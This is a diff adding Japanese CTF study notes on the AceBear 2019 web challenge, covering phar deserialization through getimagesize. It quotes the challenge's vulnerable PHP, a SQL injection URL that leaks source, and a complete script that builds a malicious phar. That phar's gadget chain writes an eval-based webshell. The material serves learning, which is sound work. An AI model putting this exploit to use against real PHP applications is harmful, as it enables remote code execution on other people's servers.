@@ -2124,10 +2124,143 @@ https://blog.usejournal.com/diving-into-unserialize-phar-deserialization-98b1254
 `phar`のDeserializeの脆弱性について。   
 https://medium.com/@knownsec404team/extend-the-attack-surface-of-php-deserialization-vulnerability-via-phar-d6455c6a1066   
 `phar`の脆弱性のWordpressでの具体例。   
+
+## phar / getimagesize / custom gadget (AceBear CTF2019 best band of asia)
+https://ctf.yeuchimse.com/acebear-security-contest-2019-duudududduduudstore-image-service-best-band-of-asia-web-100/  
+https://movrment.blogspot.com/2019/04/acebear-ctf-2019-web-category.html  
+- **entrypoint**  
+まず`http://3.0.183.241/index.php?controller=image&act=detail&id=1111+union+select+'/var/www/html/index.php'+-+-`でSQL Injectionでソースをリークするとこから？？？？  
+`controller_image.php`  
+以下で明らかにSQL Injectionできる。また、`str_replace`で記号を置換してるから、`../`みたいなのは無理そう。  
+```php
+public function detail(){    
+    if(isset($_GET["id"])){
+        $image = $this->model->fetch_one("SELECT filename FROM photos WHERE id=".$_GET["id"]);
+        $yummy = ["..","//","<",">"];
+        $filename = str_replace($yummy," ",$image["filename"]);
+        @readfile($filename);
+    }
+}
+```
+ファイルをアップロードする箇所はこんな感じ?  
+`$_FILES["fileToUpload"]["tmp_name"]`の値は`/tmp/phpXNO3Hl`みたいな感じっぽい。  
+`"fileToUpload"`はHTMLのinputの名前。  
+```php
+$check = file_exists($_FILES["fileToUpload"]["tmp_name"]);
+if($check !== false){
+    $image = new image(null,null,null,null);                        
+    $image->set_file(rand().".jpg");
+    $image->set_data(file_get_contents($_FILES["fileToUpload"]["tmp_name"]));
+    $image->save();                        
+}
+```
+`save`メソッドで、画像ファイルを保存する。  
+```php
+public function save(){        
+    global $local_dir;
+    global $root_dir;
+    $yummy = ["..","//","<",">"];
+    $filename = str_replace($yummy," ",$this->file);
+    file_put_contents($root_dir."/".$local_dir.$filename, $this->data);
+    echo "Uploaded: ".$local_dir.$filename;
+}
+```
+`controller_audio`クラスの中には以下の怪しい`__destruct`があってこれがObject Injectionに使えそう。  
+```php
+public function __destruct(){
+    if($this->default_audio !== null){                
+        $this->default_audio->save();
+        header("Location:index.php");
+    }
+}
+```
+`default_audio`クラスには以下のように怪しい`fetchImagePage`メソッドがある。  
+`$url`にはhttpかhttps以外は弾かれているが、`$image = $tag->getAttribute('src');`には入力の制限がないので、これがそのあと`if(@getimagesize($image)){`に入るためPHARのRCEできるやつできる！  
+```php
+public function fetchImagePage(){
+    include "view/view_fetchimagepage.php";
+    $url = isset($_POST['Pagelink'])?$_POST['Pagelink']:null;    
+    if($url !== null){
+        $urlParts = parse_url($url);
+        if ($urlParts === false || !in_array($urlParts["scheme"], ['http', 'https'])) {
+            die("<h1>Invalid Url</h1><img src=\"https://i.pinimg.com/originals/17/48/6d/17486d34b9d0bd19353af01fb13b1fc4.gif\">");
+        }
+        $html = file_get_contents($url);
+        $doc = new DOMDocument();
+        @$doc->loadHTML($html);
+        $tags = $doc->getElementsByTagName('img');
+        $count = 0;
+        foreach ($tags as $tag) {
+            $count++;
+            if($count<=10){
+                $image = $tag->getAttribute('src');   
+                if(@getimagesize($image)){
+                    echo "<img src=\"".$image."\"><br/>";
+                }
+            }
+        }                
+    }            
+}
+```
+- **payload**  
+まず`controller_audio`クラスの`__destruct()`の中の`save()`メソッドを使いたい。  
+`$default_audio`にはどのクラスの`save()`を使うかを指定するので、`image`クラスの`save()`メソッドを使うように指定する。  
+`image`クラスの`$image->file='rce.php'`,`$image->data='<?php echo "1337"; var_dump(eval($_GET["eval"]));';`をセットすることでWebshellを設置する！  
+```php
+<?php
+class controller_audio {
+    public $default_audio;
+    public function __destruct(){
+        if($this->default_audio !== null){                
+            $this->default_audio->save();
+        }
+    }
+}
+class image {
+    public $title;
+    public $file;
+    public $data;
+    public $id;
+    public $album_id;
+    public function __construct($title,$file,$id,$album_id){
+        $this->title = $title;
+        $this->file = $file;
+        $this->id = $id;
+        $this->album_id = $album_id;
+    }
+    public function save() {        
+        $local_dir = 'files/';
+        $root_dir = '.';
+        $yummy = ["..","//","<",">"];
+        $filename = str_replace($yummy," ",$this->file);
+        echo $root_dir."/".$local_dir.$filename;
+        file_put_contents($root_dir."/".$local_dir.$filename, $this->data);
+        echo "Uploaded: ".$local_dir.$filename;
+    }
+}
+@unlink('phar.phar');
+$phar = new Phar('phar.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'test');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+$o = new controller_audio();
+$image = new image(null,null,null,null);
+$image->file = 'rce.php';
+$image->data = '<?php echo "1337"; var_dump(eval($_GET["eval"]));';
+$o->default_audio = $image;
+$phar->setMetadata($o);
+$phar->stopBuffering();
+getimagesize('phar://phar.phar/test.txt');
+?>
+```
+## (AceBear CTF2019 web 100)
+https://ctf.yeuchimse.com/acebear-security-contest-2019-duudududduduudstore-image-service-best-band-of-asia-web-100/  
+https://movrment.blogspot.com/2019/04/acebear-ctf-2019-web-category.html  
+- **entrypoint**  
+- **payload**  
 ##
 - **entrypoint**  
 - **payload**  
-
 ##
 - **entrypoint**  
 - **payload**  
